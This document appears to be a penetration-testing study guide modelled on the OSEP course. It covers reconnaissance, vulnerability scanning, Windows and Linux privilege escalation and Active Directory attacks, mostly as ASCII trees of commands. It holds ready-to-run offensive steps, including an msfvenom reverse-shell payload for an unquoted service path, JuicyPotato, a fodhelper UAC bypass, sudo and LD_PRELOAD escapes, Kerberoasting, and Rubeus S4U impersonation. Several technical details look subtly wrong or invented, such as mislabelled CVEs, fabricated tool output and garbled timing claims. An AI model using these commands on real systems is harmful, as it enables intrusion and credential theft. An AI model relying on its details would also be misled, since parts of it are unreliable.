# OSEP — Offensive Security Experienced Penetration Tester
## Advanced Penetration Testing & Enterprise Red Team Operations

**Author:** DarcHacker  
**LinkedIn:** [Mostafa Ibrahim](https://www.linkedin.com/in/mostafa-ibrahim-60b543341)  
**Date:** 2026  
**Status:** Complete Advanced Penetration Testing Guide  

---

## Table of Contents

| Module | Focus Area | Key Objectives |
|--------|-----------|-----------------|
| **00** | [Active Reconnaissance](#module-00-active-reconnaissance) | Network mapping, service enumeration, footprinting |
| **01** | [Vulnerability Scanning & Assessment](#module-01-vulnerability-scanning--assessment) | Nessus, OpenVAS, custom exploitation |
| **02** | [Windows Exploitation](#module-02-windows-exploitation) | Kernel exploits, UAC bypass, privilege escalation |
| **03** | [Linux Exploitation](#module-03-linux-exploitation) | Kernel exploits, SUID abuse, capability bypass |
| **04** | [Active Directory Attacks](#module-04-active-directory-attacks) | Kerberoasting, delegation abuse, trust exploitation |
| **05** | [Antivirus & EDR Evasion](#module-05-antivirus--edr-evasion) | Signature bypass, behavior evasion, detection techniques |
| **06** | [Persistence & Backdoors](#module-06-persistence--backdoors) | Advanced persistence, rootkits, hidden access |
| **07** | [Post-Exploitation](#module-07-post-exploitation) | Credential theft, data extraction, pivot planning |
| **08** | [C2 Infrastructure](#module-08-c2-infrastructure) | Custom C2, protocol design, operational security |
| **09** | [Social Engineering](#module-09-social-engineering) | Phishing, pretexting, manipulation techniques |
| **10** | [Wireless Attacks](#module-10-wireless-attacks) | WiFi exploitation, rogue access points, WPA3 |
| **11** | [Cloud Exploitation](#module-11-cloud-exploitation) | AWS, Azure, GCP attacks and misconfigurations |
| **12** | [Network-Based Attacks](#module-12-network-based-attacks) | MITM, DNS spoofing, BGP hijacking, traffic manipulation |
| **13** | [Web Application Integration](#module-13-web-application-integration) | Web apps as pivot points, API exploitation |
| **14** | [Incident Response Evasion](#module-14-incident-response-evasion) | Forensic evasion, log manipulation, anti-forensics |
| **15** | [Physical Security](#module-15-physical-security) | Badge cloning, facility access, hardware compromise |
| **16** | [Supply Chain Attacks](#module-16-supply-chain-attacks) | Vendor compromise, dependency injection, SolarWinds-style |
| **17** | [Reporting & Communication](#module-17-reporting--communication) | Professional documentation, executive communication |
| **18** | [Engagement Strategy](#module-18-engagement-strategy) | Multi-phase operations, long-term persistence planning |

---

## MODULE 00: Active Reconnaissance

### Network Mapping & Enumeration

**Discovering organizational network infrastructure:**

```
RECONNAISSANCE HIERARCHY:

PHASE 1: PASSIVE INTELLIGENCE
├── OSINT gathering (no network traffic)
│   ├── LinkedIn enumeration (employee count, departments)
│   ├── DNS records via whois/DNS databases
│   ├── Certificate transparency logs (domain discovery)
│   ├── GitHub repository scanning (credential leakage)
│   ├── Shodan/Censys (internet-wide scanning)
│   ├── Wayback Machine (historical data)
│   └── Job listings (technology stack disclosure)
│
└── Analysis
    ├── IP range identification (ASN lookups)
    ├── Domain structure mapping
    ├── Organizational hierarchy
    ├── Technology stack identification
    └── Vulnerability research (known issues)

PHASE 2: ACTIVE NETWORK DISCOVERY
├── Ping sweep (ICMP)
│   └── icmp-scan: nmap -sn -n 192.168.0.0/24
│   └── Response analysis (live hosts)
│
├── Port scanning (TCP)
│   ├── Quick scan: nmap -p 22,80,443,3389,5985 <target>
│   ├── Full scan: nmap -p- <target> (all 65535 ports)
│   ├── Service detection: nmap -sV <target>
│   ├── OS detection: nmap -O <target> (requires root)
│   └── Advanced: nmap -sT -sU -A <target> (TCP + UDP + aggressive)
│
├── UDP scanning (often overlooked)
│   ├── DNS (53/udp)
│   ├── SNMP (161/udp) - unmonitored often
│   ├── NTP (123/udp)
│   └── nmap -sU -p 53,123,161 <target>
│
└── Firewall evasion
    ├── Timing options: -T1 (paranoid), -T5 (insane)
    ├── Fragment packets: -f (fragment data)
    ├── Decoy scanning: -D (hide among others)
    ├── Idle scanning: -sI (use zombie host)
    └── Source port spoofing: --source-port 53
```

### Service Enumeration

**Detailed service identification and profiling:**

```
CRITICAL WINDOWS SERVICES:

1. ACTIVE DIRECTORY (LDAP - 389/tcp, 636/tcp)
   ├── LDAP enumeration
   │   ├── ldapsearch -h <dc> -x -b "dc=example,dc=com"
   │   ├── Extract: users, groups, computers, trusts
   │   ├── Output: cn=user,cn=Users,dc=example,dc=com
   │   └── Permission verification
   │
   ├── ADO.NET query
   │   ├── DirectoryEntry([LDAP://...])
   │   ├── SearchResultCollection
   │   └── Enumerate full directory
   │
   └── No authentication required (often)
       ├── "dc=example,dc=com" publicly enumerable
       ├── User list extraction
       ├── Group membership discovery
       └── Service principal enumeration

2. KERBEROS (88/tcp, 88/udp)
   ├── AS-REP roasting targets
   │   ├── GetNPUsers.py -no-pass -userfile users.txt example.com
   │   ├── Identify accounts: UF_DONT_REQUIRE_PREAUTH flag
   │   ├── Extract hash without authentication
   │   └── Crack offline (1.3 sec vs 15 min AD)
   │
   ├── Kerberoasting targets
   │   ├── GetUserSPNs.py -request example.com
   │   ├── Find: MSSQLSvc, HTTP, cifs services
   │   ├── Request TGS tickets
   │   └── Crack service account passwords
   │
   └── Delegation abuse
       ├── Constrained delegation (S4U)
       ├── Unconstrained delegation (MachineAccount$)
       └── Impersonation without credentials

3. NETLOGON (445/tcp - SMB)
   ├── Share enumeration
   │   ├── smbclient -L \\<host> -U% (null session)
   │   ├── Retrieve: ADMIN$, C$, IPC$, custom shares
   │   ├── Share permissions analysis
   │   └── File access verification
   │
   ├── Null session exploitation
   │   ├── Connect without credentials
   │   ├── wmic /node:<host> /user:% os get caption
   │   ├── Enumerate: users, groups, shares
   │   └── Often Windows 2000-2003 only
   │
   └── NTLM relay attacks
       ├── Responder (capture NTLM hashes)
       ├── ntlmrelayx (relay to other systems)
       ├── Elevation: user → admin
       └── Lateral movement: system1 → system2

4. RDP (3389/tcp)
   ├── Version detection
   │   ├── Impacket rdp client
   │   ├── Version fingerprinting
   │   └── Known vulnerability mapping
   │
   ├── Credential testing
   │   ├── Hydra -l admin -P wordlist rdp://target
   │   ├── Username enumeration (valid/invalid timing)
   │   ├── Weak password identification
   │   └── Account lockout monitoring
   │
   └── BlueKeep exploitation
       ├── CVE-2019-0708 (pre-auth RCE)
       ├── Affects Windows 7, 2008 R2
       ├── No network authentication required
       └── Automatic exploitation tools

5. WINRM (5985/tcp, 5986/tcp)
   ├── Remote code execution
   │   ├── Evil-WinRM (Ruby-based)
   │   ├── Pass credentials → execute commands
   │   ├── File upload/download
   │   └── Interactive shell spawning
   │
   ├── Privilege detection
   │   ├── Determine user privileges
   │   ├── Group membership verification
   │   ├── Token capabilities
   │   └── Elevation path planning
   │
   └── Living off the land
       ├── PowerShell (native scripting)
       ├── WMI (Windows Management Instrumentation)
       ├── CIM (Common Information Model)
       └── COM automation (invisible execution)

UNIX/LINUX SERVICES:

1. SSH (22/tcp)
   ├── Version fingerprinting
   │   ├── Connect and read banner
   │   ├── OpenSSH 7.4 → known vulnerabilities
   │   ├── Paramiko (Python SSH) detection
   │   └── Exploit database lookup
   │
   ├── Authentication methods
   │   ├── Password (brute-forceable)
   │   ├── Public key (user recon via errors)
   │   ├── Host-based (deprecated, sometimes enabled)
   │   ├── Kerberos (centralized auth)
   │   └── Challenge-response (weak implementation)
   │
   ├── Username enumeration
   │   ├── Timing analysis (valid vs invalid users)
   │   ├── OpenSSH discrepancy (pre-auth disconnect)
   │   ├── Error message differences
   │   └── Authentication delay patterns
   │
   └── Weak algorithms
       ├── Diffie-Hellman groups (CVE-2016-0778)
       ├── Key exchange algorithms
       ├── Cipher suites
       └── MAC algorithms

2. FTP (21/tcp)
   ├── Anonymous access
   │   ├── Connect: ftp <host>
   │   ├── Login: anonymous / email@example.com
   │   ├── File directory traversal
   │   ├── Sensitive file discovery
   │   └── Configuration file access
   │
   ├── Credentials in FTP
   │   ├── Plain text protocol (no encryption)
   │   ├── Packet sniffing (passive mode)
   │   ├── Credential harvesting
   │   └── Man-in-the-middle attacks
   │
   └── FTP bounce attack
       ├── Use FTP server as proxy
       ├── Bypass firewalls (internal port access)
       ├── Scan internal networks
       └── PORT command abuse

3. NFS (2049/tcp)
   ├── Mount enumeration
   │   ├── showmount -e <host>
   │   ├── Display exported filesystems
   │   ├── Permission levels
   │   └── Access verification
   │
   ├── Mount exploitation
   │   ├── mount -t nfs <host>:/export /mnt/nfs
   │   ├── Direct filesystem access
   │   ├── Root squashing bypass (uid=0)
   │   ├── UID spoofing (custom uid)
   │   └── File modification/deletion
   │
   └── No authentication
       ├── IP-based access control only
       ├── Internal firewall bypass
       ├── Lateral movement vector
       └── Data extraction

4. SNMP (161/udp)
   ├── Community string enumeration
   │   ├── snmpwalk -c public <host>
   │   ├── Common strings: public, private, manager
   │   ├── Default credentials often unchanged
   │   └── System information extraction
   │
   ├── System information gathered
   │   ├── Hostname and domain
   │   ├── Running processes
   │   ├── Installed software
   │   ├── Network configuration
   │   ├── Routing tables
   │   ├── Interface information
   │   └── Potential vulnerabilities
   │
   └── Privilege escalation
       ├── SNMP write community strings
       ├── Syslog destination modification
       ├── Trap destination setting
       ├── MIB modification
       └── Configuration changes
```

---

## MODULE 01: Vulnerability Scanning & Assessment

### Automated Vulnerability Identification

**Using scanners effectively in engagement context:**

```
VULNERABILITY SCANNER SELECTION:

1. NESSUS (Tenable)
   ├── Capabilities
   │   ├── Comprehensive plugin library (90,000+)
   │   ├── Credential-based deep scanning
   │   ├── Compliance checking (CIS, PCI-DSS, HIPAA)
   │   ├── Risk-based metrics
   │   └── Integration with endpoints (agent-based)
   │
   ├── Scan types
   │   ├── Host discovery (ping/port scan)
   │   ├── Service detection (default plugins)
   │   ├── Vulnerability assessment (full library)
   │   ├── Compliance audit (policy-based)
   │   ├── Web application scan (separate module)
   │   └── Malware detection (agent-based)
   │
   └── Exploitation
       ├── Detailed vulnerability descriptions
       ├── Proof-of-concept scripts (when available)
       ├── Affected software list
       ├── Remediation guidance
       └── CVSS scoring

2. OPENVAS (Open Source)
   ├── Installation
   │   ├── Docker: docker run -p 9392:9392 greenbone/openvas
   │   ├── Standalone: apt install openvas
   │   ├── Architecture: Scanner + Manager + Web Interface
   │   └── NVT (Network Vulnerability Tests) updates
   │
   ├── Scanning
   │   ├── Full + fast (default)
   │   ├── Full + medium
   │   ├── Full + slow
   │   ├── Credential-based (SSH, SMB, SNMP)
   │   └── Port list selection (SSH, RDP, HTTP, All)
   │
   └── Results analysis
       ├── Severity ranking (High/Medium/Low)
       ├── CVSS calculation
       ├── Affected resources
       ├── CVE/NVD cross-referencing
       └── Remediation steps

3. QUALYS / RAPID7 (Cloud-based)
   ├── Advantages
   │   ├── Always-updated vulnerability database
   │   ├── Centralized reporting
   │   ├── Multi-scan coordination
   │   ├── Compliance automation
   │   └── Integration with ticketing systems
   │
   ├── Disadvantages
   │   ├── Internet connectivity required
   │   ├── Cost per scan/asset
   │   ├── Data sensitivity (cloud storage)
   │   └── Rate limiting

VULNERABILITY ANALYSIS METHODOLOGY:

STEP 1: SCAN EXECUTION
├── Scan planning
│   ├── Define scan scope (IP ranges)
│   ├── Select scan profile (aggressive? slow?)
│   ├── Credential provisioning (domain admin? service account?)
│   ├── Timing (off-hours? continuous?)
│   └── Target: compromise vs discovery
│
├── Credential preparation
│   ├── Local admin credentials (Windows)
│   ├── Root credentials (Unix)
│   ├── Domain credentials (Active Directory)
│   ├── Service account credentials
│   ├── Separate test account (avoid impact)
│   └── Emergency stop procedure

└── Scan execution
    ├── Monitor progress
    ├── Adjust timing if needed
    ├── Verify target accessibility
    ├── Handle authentication failures
    └── Log all scan activity

STEP 2: RESULTS ANALYSIS
├── False positive filtering
│   ├── Ignore informational findings (font version, etc.)
│   ├── Verify critical findings
│   ├── Test exploitability
│   ├── Confirm impact assessment
│   └── Document assumptions
│
├── Vulnerability prioritization
│   ├── Critical (CVSS 9+): immediate exploitation
│   ├── High (CVSS 7-8.9): high-value targets
│   ├── Medium (CVSS 4-6.9): opportunistic
│   ├── Low (CVSS <4): low-value effort
│   └── Consider: feasibility + impact

└── Exploitation planning
    ├── Tools selection
    ├── Payload preparation
    ├── Success criteria
    ├── Fallback options
    ├── Detection risk assessment
    └── Timeline estimates

STEP 3: EXPLOITATION
├── Single vulnerability
│   ├── Direct exploitation
│   ├── Verification of success
│   ├── Access proof
│   ├── Post-exploitation setup
│   └── Coverage for next phase
│
├── Vulnerability chain
│   ├── Vulnerability A → Vulnerability B → Vulnerability C
│   ├── Each enabling the next
│   ├── Example: SQLi → RCE → Privilege escalation → DA
│   ├── Attack sequence critical (right order)
│   └── Documentation of chain

└── Impact documentation
    ├── Proof of access
    ├── Screenshot/evidence
    ├── Credential extraction
    ├── System compromise
    ├── Timeline of exploitation
    └── Cleanup procedures

COMMON HIGH-VALUE VULNERABILITIES:

Critical Findings (exploit immediately):
├── Unpatched kernel exploits
│   └── Windows: MS17-010, CVE-2021-1732
│   └── Linux: CVE-2021-22555, CVE-2021-3493
│
├── Default credentials
│   ├── Admin:admin
│   ├── Administrator:password
│   ├── Root:password
│   ├── Tomcat manager/s3cr3t
│   ├── MySQL root:password
│   └── Database admin defaults
│
├── Authentication bypass
│   ├── No authentication on critical function
│   ├── Weak authentication checks
│   ├── Session management flaws
│   ├── Direct object reference (no auth)
│   └── API without authentication
│
└── Remote code execution
    ├── Unauthenticated RCE
    ├── SQL injection → xp_cmdshell
    ├── XXE → file read or RCE
    ├── Deserialization gadgets
    └── Template injection

High Value:
├── SQL injection (with output)
├── Command injection
├── Privilege escalation
├── Information disclosure
├── Weak cryptography
└── Insecure configuration
```

---

## MODULE 02: Windows Exploitation

### Privilege Escalation Techniques

**Escalating from user to SYSTEM:**

```
LOCAL PRIVILEGE ESCALATION (LPE):

METHODOLOGY:

STEP 1: ENUMERATION
├── System information
│   ├── systeminfo
│   │   ├── OS version (Windows 10 19043 vs 19045?)
│   │   ├── Build number (correlate with KB patches)
│   │   ├── System boot time (uptime patterns)
│   │   ├── Install date
│   │   └── Hotfixes installed (Get-Hotfix)
│   │
│   ├── Architecture
│   │   ├── 32-bit vs 64-bit (exploit selection)
│   │   ├── CPU architecture (ARM, x86, x64)
│   │   └── Virtualization detection
│   │
│   └── Kernel version
       ├── Vulnerability mapping (searchsploit)
       ├── Patch level (missing critical updates)
       ├── Known bypass techniques
       └── Exploit availability

├── User privileges
│   ├── whoami /priv
│   │   ├── SeDebugPrivilege → process dumping
│   │   ├── SeImpersonatePrivilege → token abuse
│   │   ├── SeChangeNotifyPrivilege → directory access
│   │   ├── SeBackupPrivilege → backup read
│   │   └── SeSystemtimePrivilege → time manipulation
│   │
│   ├── Group membership
│   │   ├── whoami /groups
│   │   ├── Backup Operators (SYSTEM access)
│   │   ├── DPT (Disk Partitions)
│   │   ├── Print Operators (service control)
│   │   └── Server Operators (system configuration)
│   │
│   └── Token information
       ├── Process privilege level (Medium/High/System)
       ├── Integrity level (Low/Medium/High/System)
       ├── Token type (Primary/Impersonation)
       └── Impersonation level (available if token stolen)

├── Services running as SYSTEM
│   ├── tasklist /v (all running processes)
│   ├── Get-Service | Where {$_.Status -eq 'Running'}
│   ├── Identify SYSTEM-level services
│   ├── Analyze service binary paths
│   ├── Check binary permissions
│   ├── Identify weak DACL (Discretionary ACL)
│   └── Service restart frequency

└── Scheduled tasks
    ├── tasklist /svc (find services)
    ├── wmic process list
    ├── schtasks /query /v
    ├── SYSTEM-level scheduled tasks
    ├── Executable locations
    ├── Execution permissions
    └── Modification opportunities

STEP 2: EXPLOITATION VECTORS

1. UNQUOTED SERVICE PATH
   ├── Example path: C:\Program Files\Service\update.exe
   ├── Exploitation:
   │   ├── No quotes → Windows searches in order:
   │   ├── C:\Program.exe
   │   ├── C:\Program Files\Service\update.exe
   │   ├── Attacker places executable: C:\Program.exe
   │   └── Service restart → payload executed as SYSTEM
   │
   ├── Verification:
   │   ├── wmic service get name,displayname,pathname | findstr /v "C:\Windows"
   │   ├── Look for paths WITHOUT quotes
   │   ├── Check permissions on C:\
   │   ├── Verify write access
   │   └── Service restart permissions
   │
   └── Exploitation process:
       ├── Create payload: msfvenom -p windows/meterpreter/reverse_tcp
       ├── Place at: C:\Program.exe
       ├── Restart service: net stop ServiceName && net start ServiceName
       ├── OR wait for automatic restart
       └── Verify: reverse shell spawns as SYSTEM

2. WEAK SERVICE PERMISSIONS
   ├── Identify vulnerable services:
   │   ├── accesschk.exe -qlc ServiceName
   │   ├── Identify: Everyone, Users, low-privilege groups
   │   ├── Check: Start, Stop, Delete, Change Configuration
   │   └── Dangerous: Modify service binary path
   │
   ├── Exploitation:
   │   ├── sc config ServiceName binPath= "C:\payload.exe"
   │   ├── Change service binary
   │   ├── net stop ServiceName
   │   ├── net start ServiceName
   │   └── Payload executes as SYSTEM
   │
   └── Detection:
       ├── Original binary path change
       ├── Service execution audit
       ├── Process tree monitoring
       └── Sysmon detection

3. ROTTEN POTATO / JUICY POTATO
   ├── Concept:
   │   ├── SeImpersonate or SeAssignPrimaryToken privilege
   │   ├── These privileges enable token impersonation
   │   ├── Token duplication → SYSTEM token
   │   ├── Process execution with SYSTEM token
   │   └── Full SYSTEM access
   │
   ├── Prerequisites:
   │   ├── Running process with SeImpersonate enabled
   │   ├── Often: Web server (IIS), service accounts
   │   ├── Windows 7-10, Server 2008-2016
   │   └── Not patched with CVE-2018-8440
   │
   ├── Usage:
   │   ├── JuicyPotato.exe -l 1337 -p c:\shell.exe -t *
   │   ├── Executes shell.exe as SYSTEM
   │   ├── Output:
   │   │   └── [+] SYSTEM shell obtained!
   │   │       PID: 2456
   │   │       User: NT AUTHORITY\SYSTEM
   │   │
   │   └── Verification:
   │       ├── whoami
   │       │   └── nt authority\system
   │       └── Success!

4. KERNEL EXPLOIT (CVE-2021-1732 Example)
   ├── Vulnerability:
   │   ├── Win32k.sys privilege escalation
   │   ├── Affects: Windows 10 builds < 19045
   │   ├── Unpatched machines vulnerable
   │   └── No interaction required (local only)
   │
   ├── Exploitation:
   │   ├── Compile exploit (may need MSVC)
   │   ├── ./cve-2021-1732.exe
   │   ├── Create command execution thread
   │   ├── Execution as SYSTEM
   │   └── May not show in process list (kernel-mode)
   │
   └── Detection:
       ├── Kernel crash dump
       ├── Blue screen potential
       ├── Process monitor (unusual execution)
       └── Event log (kernel events)

UAC BYPASS TECHNIQUES:

1. UIPI BYPASS (User Interface Privilege Isolation)
   ├── Concept:
   │   ├── UAC splits user into: Low + Medium/High integrity
   │   ├── System Tray apps run as Medium
   │   ├── Registry modification bypass
   │   ├── Administrative functions callable
   │   └── Result: High integrity shell
   │
   ├── Exploitation:
   │   ├── Modify registry:
   │   │   └── Set-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value cmd.exe
   │   │
   │   ├── Trigger administrative UI:
   │   │   └── fodhelper.exe (Ease of Access)
   │   │
   │   └── Result:
   │       └── cmd.exe runs as Medium→High integrity
   │
   └── Detection:
       ├── Registry modification patterns
       ├── fodhelper.exe execution (unusual)
       ├── Process integrity level jump
       └── Parent-child process tree anomalies

2. DLL SIDE-LOADING
   ├── Concept:
   │   ├── Windows searches for DLLs in specific order
   │   ├── Current directory checked first (sometimes)
   │   ├── Legitimate app loads malicious DLL
   │   ├── DLL_PROCESS_ATTACH code runs
   │   └── Privilege level of legitimate app
   │
   ├── Example: Adobe Reader
   │   ├── Place malicious dll: cci.dll
   │   ├── AcroRd32.exe searches for cci.dll
   │   ├── Our dll loaded instead
   │   ├── Our code executes
   │   ├── Adobe Reader runs as user privileges (may be admin)
   │   └── Elevation to admin (if user is admin)
   │
   └── Detection:
       ├── Unusual DLL loading path
       ├── Process monitor (unexpected DLL)
       ├── Sysmon registry/file operations
       └── Parent process + DLL combo anomaly

STEP 3: VERIFICATION
├── Privilege confirmation
│   ├── whoami /priv (should show many privileges)
│   ├── Get-Credential (attempt elevation)
│   ├── Process token inspection
│   └── Access /windows/system32/config/sam (SYSTEM read)
│
├── Command execution
│   ├── systeminfo (should execute)
│   ├── Access restricted resources
│   ├── Modify protected files
│   ├── Create services
│   └── Dump LSASS memory

└── Post-exploitation
    ├── Establish persistence
    ├── Create hidden admin account
    ├── Setup backdoor
    ├── Credential theft
    └── Lateral movement preparation
```

---

## MODULE 03: Linux Exploitation

### Linux Privilege Escalation

**Escalating from unprivileged user to root:**

```
LINUX ENUMERATION:

STEP 1: INFORMATION GATHERING
├── System information
│   ├── uname -a (full kernel info)
│   │   ├── Linux version (4.4.0-21 → old/vulnerable)
│   │   ├── Architecture (x86_64)
│   │   ├── Kernel compile date
│   │   └── CVE mapping
│   │
│   ├── lsb_release -a (distribution)
│   │   ├── OS version (Ubuntu 16.04, CentOS 7, etc.)
│   │   ├── Code name
│   │   └── Vulnerability database lookup
│   │
│   ├── cat /etc/os-release
│   │   ├── Specific OS version
│   │   ├── Platform identification
│   │   └── Supported kernel versions
│   │
│   └── cat /proc/version (kernel details)
       └── GCC version (compiler exploits)

├── Kernel patches
│   ├── apt list --installed (Debian-based)
│   ├── rpm -qa | grep kernel (RedHat-based)
│   ├── Missing critical patches?
│   ├── Days since last update
│   └── Unpatched vulnerabilities

├── Running processes
│   ├── ps aux (all processes)
│   │   ├── Running as root (interesting targets)
│   │   ├── SUID processes
│   │   ├── Old versions (vulnerable?)
│   │   └── Commands (arguments, paths)
│   │
│   ├── root processes with high priority
│   │   ├── Daemons
│   │   ├── Services
│   │   └── Scheduled tasks (cron)
│   │
│   └── Services listening on ports
       ├── ss -tlnp (Netstat alternative)
       ├── Root-owned listeners
       ├── Privilege escalation risk
       └── Exploitation vectors

├── Installed software
│   ├── which java python perl (interpreters)
│   ├── find / -type f -name "*.jar" 2>/dev/null (Java)
│   ├── Vulnerable library versions
│   ├── Gadget chains available
│   └── Exploitation potential

└── User accounts
    ├── cat /etc/passwd (all users)
    ├── cat /etc/shadow (password hashes - if readable)
    ├── System accounts vs real users
    ├── Sudo-enabled users
    ├── Home directories
    └── Shell assignments

STEP 2: PRIVILEGE ESCALATION VECTORS

1. SUID BINARIES
   ├── Find SUID binaries:
   │   ├── find / -perm -4000 -type f 2>/dev/null
   │   ├── find / -uid 0 -perm -4000 -type f (root-owned SUID)
   │   ├── Output example: -rwsr-xr-x (s = SUID bit)
   │   └── These run as owner (often root)
   │
   ├── Common vulnerable binaries:
   │   ├── /bin/sudo (misconfig? NOPASSWD?)
   │   ├── /usr/bin/passwd (buffer overflow?)
   │   ├── /usr/bin/chfn (field overflow?)
   │   ├── /usr/bin/chsh (shell modification)
   │   ├── /usr/bin/su (authentication bypass?)
   │   ├── /usr/local/bin/* (custom SUID)
   │   └── Checks: ltrace, strace for exploitation
   │
   ├── Exploitation example (passwd):
   │   ├── strace -e openat /usr/bin/passwd 2>&1 | grep -i tmp
   │   ├── Identify temp file location
   │   ├── Race condition: modify temp file
   │   ├── Before passwd finishes
   │   ├── Privilege escalation achieved
   │   └── Root shell obtained
   │
   └── Detection:
       ├── Unusual SUID binaries
       ├── Custom applications with SUID
       ├── Misplaced system binaries
       └── Permission anomalies

2. SUDO MISCONFIGURATION
   ├── Check sudo capabilities:
   │   ├── sudo -l (list permitted commands)
   │   │   ├── (ALL) NOPASSWD:/bin/chmod
   │   │   ├── (ALL) /usr/bin/find
   │   │   ├── (ALL) /usr/bin/vi
   │   │   └── Indicates: escalation path
   │   │
   │   ├── sudoedit (file editor as root?)
   │   ├── Wildcard support in sudoers
   │   ├── Environmental variables preserved
   │   └── LD_PRELOAD exploitation
   │
   ├── Exploitation patterns:
   │   ├── sudo find / -name flag.txt -exec cat {} \;
   │   │   └── cat executes as root (find capability)
   │   │
   │   ├── sudo vim
   │   │   └── :!/bin/bash (escape to shell)
   │   │       └── Shell runs as root
   │   │
   │   ├── sudo less
   │   │   └── !/bin/bash (similar escape)
   │   │
   │   └── sudo awk 'BEGIN {system("/bin/bash")}'
   │       └── Execute arbitrary command
   │
   └── Bypass techniques:
       ├── LD_PRELOAD injection
       │   ├── Create library: preload.c
       │   ├── gcc -shared -fPIC preload.c -o preload.so
       │   ├── sudo LD_PRELOAD=/tmp/preload.so /usr/bin/find
       │   ├── Root code execution via library
       │   └── Shell elevation
       │
       ├── Path manipulation
       │   ├── Create fake /usr/bin/program
       │   ├── Modify PATH
       │   ├── sudo calls our program
       │   └── Root execution
       │
       └── Environment variable abuse
           ├── HISTFILE, HISTSIZE, PYTHONHOME
           ├── Execute code via environment
           └── Root execution context

3. KERNEL EXPLOIT
   ├── Identify kernel vulnerability:
   │   ├── uname -r (get kernel version)
   │   ├── searchsploit Linux kernel (find exploits)
   │   ├── Verify affected version
   │   ├── Check if patched
   │   └── Exploitation feasibility
   │
   ├── CVE-2021-22555 (Netfilter) Example:
   │   ├── Affects: Linux 5.8-5.10
   │   ├── Vulnerability: integer overflow
   │   ├── Impact: Arbitrary kernel memory write
   │   ├── Exploitation: root shell
   │   └── Tools: Precompiled exploits available
   │
   ├── Compilation:
   │   ├── gcc -o exploit exploit.c
   │   ├── May need header files (kernel-devel)
   │   ├── Cross-compilation (different architecture)
   │   ├── Testing on local system first
   │   └── Debugging if needed
   │
   └── Execution:
       ├── ./exploit (run exploit)
       ├── Kernel crash potential (DoS)
       ├── Root shell if successful
       ├── Verification: whoami → root
       └── Post-exploitation setup

4. CRON JOB EXPLOITATION
   ├── Identify root cron jobs:
   │   ├── crontab -l (current user's crons)
   │   ├── sudo crontab -l (root's crons)
   │   ├── /etc/cron.d/* (system crons)
   │   ├── /etc/cron.hourly, daily, weekly, monthly/
   │   ├── Look for: writable scripts, readable commands
   │   └── Execution timing
   │
   ├── Common vulnerable patterns:
   │   ├── 0 * * * * /opt/backup.sh
   │   │   ├── Runs every hour
   │   │   ├── Check permissions: ls -la /opt/backup.sh
   │   │   ├── If writable: modify to add payload
   │   │   ├── Next hour: executes as root
   │   │   └── Root shell obtained
   │   │
   │   ├── 0 0 * * * /usr/bin/backup /home/user/data /tmp/backup
   │   │   ├── Path traversal in arguments
   │   │   ├── /tmp/backup already exists (race?)
   │   │   ├── Wildcard expansion risk
   │   │   └── May lead to privilege escalation
   │   │
   │   └── */5 * * * * tar -czf /tmp/backup.tar.gz /data
   │       ├── Runs every 5 minutes
   │       ├── /tmp writable by all users
   │       ├── Create symlink: ln -s /root/.ssh /tmp/backup.tar.gz
   │       ├── Tar follows symlink
   │       ├── SSH keys extracted
   │       └── SSH as root (if key-based auth)
   │
   └── Exploitation:
       ├── Modify cron script
       ├── Add payload
       ├── Wait for execution
       ├── Root shell obtained
       └── Persistence setup

STEP 3: ROOT SHELL VERIFICATION
├── Confirmation:
│   ├── whoami (shows root)
│   ├── id -u (shows uid=0)
│   ├── sudo -l (not needed)
│   └── read /etc/shadow (should succeed)
│
└── Post-exploitation:
    ├── Establish persistence
    ├── Create backdoor account
    ├── Install rootkit/backdoor
    ├── Cover tracks
    └── Lateral movement
```

---

## MODULE 04: Active Directory Attacks

### Domain Compromise Techniques

**Escalating to Domain Admin and beyond:**

```
AD ATTACK METHODOLOGY:

INITIAL ACCESS → DOMAIN USER → DOMAIN ADMIN → ENTERPRISE ADMIN → FOREST ROOT

PHASE 1: KERBEROASTING
├── Concept:
│   ├── Service accounts have SPNs (Service Principal Names)
│   ├── TGS tickets encrypted with service account hash
│   ├── User can request TGS for any service
│   ├── Offline cracking of service account password
│   ├── Service account = often domain admin
│   └── Result: DA credentials
│
├── Identification:
│   ├── GetUserSPNs.py -request -dc-ip <dc_ip> domain.com/user:password
│   ├── Output:
│   │   ├── MSSQLSvc/sql1.domain.com:1433
│   │   ├── HTTP/webapp.domain.com:80
│   │   ├── LDAP/dc.domain.com:389
│   │   └── Others...
│   │
│   └── Observation: service accounts often "sql_service", "iis_service"
│
├── Exploitation:
│   ├── Crack TGS hash:
│   │   ├── hashcat -m 13100 kerb_hashes.txt rockyou.txt
│   │   ├── Typical: 30 seconds - 5 minutes per hash
│   │   └── Service password found
│   │
│   └── Use credentials:
       ├── evil-winrm -i <server> -u domain\sql_service -p password
       ├── psexec -u domain\sql_service \\server cmd.exe
       ├── Often: SQL_SERVICE → domain admin
       └── Domain compromise achieved

PHASE 2: CONSTRAINED DELEGATION ABUSE
├── Identification:
│   ├── Get-ADComputer -Filter * -Properties msDS-AllowedToDelegateTo
│   ├── Look for: msDS-AllowedToDelegateTo attribute
│   ├── Example output:
│   │   ├── webserver → cifs/dc.domain.com:445
│   │   ├── appserver → MSSQLSvc/sql1.domain.com:1433
│   │   └── Others...
│   │
│   └── Significance: can impersonate ANY user to delegated service
│
├── Exploitation:
│   ├── Control source account (webserver machine account)
│   ├── Create forged S4U2 ticket:
│   │   ├── S4U2Self: Get TGS for any user → service
│   │   ├── S4U2Proxy: Forward TGS to delegated service
│   │   ├── Result: CIFS/DC access (admin share)
│   │   └── DC compromise
│   │
│   └── Tools:
       ├── Rubeus.exe s4u /user:webserver$ /rc4:<hash> \
       │   /impersonateuser:Administrator /msdsspn:cifs/dc \
       │   /ptt /dc:dc.domain.com
       │
       └── Result: Admin access to DC

PHASE 3: UNCONSTRAINED DELEGATION
├── Concept:
│   ├── Server marked with "Trust this computer for delegation"
│   ├── Any service can delegate to any other service
│   ├── DC TGT can be captured from connecting user
│   ├── TGT can be reused (impersonation)
│   └── DA access possible
│
├── Detection:
│   ├── Get-ADComputer -Filter {TrustedForDelegation -eq $true}
│   ├── Output: unconstrained delegation computers
│   ├── Often: Print servers, app servers
│   └── Compromise = domain control possible
│
├── Exploitation (Printer Bug):
│   ├── Force connection: coercer.py -l attacker -t dc
│   ├── DC initiates auth to attacker's unconstrained server
│   ├── Capture DC TGT (from authentication)
│   ├── Use TGT to access any resource
│   ├── Domain compromise achieved
│   └── Entire forest potentially compromised
│
└── Detection evasion:
    ├── No obvious unauthorized access
    ├── Normal authentication captured
    ├── Legitimate-looking usage
    └── Hard to detect in real-time

